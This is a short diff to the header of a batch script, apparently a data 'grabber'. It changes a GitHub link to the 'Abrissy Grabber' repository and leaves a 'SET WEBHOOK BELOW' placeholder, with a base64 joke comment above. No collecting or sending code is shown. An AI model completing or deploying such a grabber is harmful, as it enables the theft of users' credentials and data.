@@ -1,5 +1,5 @@
 :: RmVtYm95cyBsb3ZlIEFicmlzc3kKQWJyaXNzeSBsb3ZlIGZlbWJveXM=
-:: https://github.com/Abrissy/AbrissyGrabber
+:: https://github.com/Abrissyy/Abrissy-Grabber/
 @echo off 
 chcp 65001
 ::SET WEBHOOK BELOW
